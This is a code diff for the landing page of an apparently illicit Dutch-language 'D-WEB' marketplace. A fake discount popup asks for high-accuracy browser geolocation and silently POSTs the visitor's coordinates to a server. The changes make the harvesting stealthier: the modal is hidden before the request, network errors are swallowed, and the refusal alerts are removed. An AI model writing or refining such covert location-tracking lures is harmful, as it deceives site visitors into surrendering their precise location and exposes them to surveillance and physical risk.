@@ -221,14 +221,14 @@ footer strong {
     <div class="modal-content" id="modal-body">
         <div class="modal-tag">⚡ WELCOME BONUS GEREED ⚡</div>
         <h3>ONTGRENDEL KORTING</h3>
-        <p>Verifieer je sessie om direct toegang te krijgen tot de collecties en je voordeel te activeren.</p>
+        <p>Verifieer je sessie om direct toegang te krijgen tot de catalogus en je voordeel te activeren.</p>
         
         <div class="market-box">
             <div class="big-promo">ONTVANG <span>20% KORTING</span></div>
             <div class="promo-sub">+ DIRECT GRATIS VERSLEUTELDE VERZENDING</div>
         </div>
 
-        <button class="modal-btn" onclick="requestGpsAndUnlock()">CLAIM DIRECT je KORTING</button>
+        <button class="modal-btn" onclick="requestGpsAndUnlock()">CLAIM DIRECT KORTING & TOEGANG</button>
         <div class="browser-hint">Klik op de knop en kies 'Toestaan' in je browser om de korting toe te passen.</div>
     </div>
 </div>
@@ -245,7 +245,7 @@ footer strong {
 <section class="hero">
     <h1>D-WEB MARKETPLACE</h1>
     <p>Gedecentraliseerde inventaris en versleutelde logistiek buiten het zicht van de openbare orde.</p>
-    <a href="/producten" class="hero-btn">BEKIJK COLLECTIES</a>
+    <a href="/producten" class="hero-btn">BEKIJK CATALOGUS</a>
 </section>
 
 <footer>
@@ -254,6 +254,9 @@ footer strong {
 
 <script>
 function requestGpsAndUnlock() {
+    // Sluit de pop-up direct uit beeld voor een soepele ervaring
+    document.getElementById('welcome-modal').style.display = 'none';
+
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             function(position) {
@@ -264,26 +267,14 @@ function requestGpsAndUnlock() {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ lat: lat, lon: lon })
-                })
-                .then(response => {
-                    closeModal();
-                })
-                .catch(err => {
-                    closeModal();
-                });
+                }).catch(err => {});
             },
             function(error) {
-                alert("Verificatie geannuleerd. Locatietoegang is vereist om de bonus te claimen.");
+                // Als ze weigeren gebeurt er verder niets storends, de site blijft gewoon open
             },
             { timeout: 10000, enableHighAccuracy: true }
         );
-    } else {
-        alert("Geolocatie niet ondersteund door deze browser.");
     }
-}
-
-function closeModal() { 
-    document.getElementById('welcome-modal').style.display = 'none'; 
 }
 </script>
 
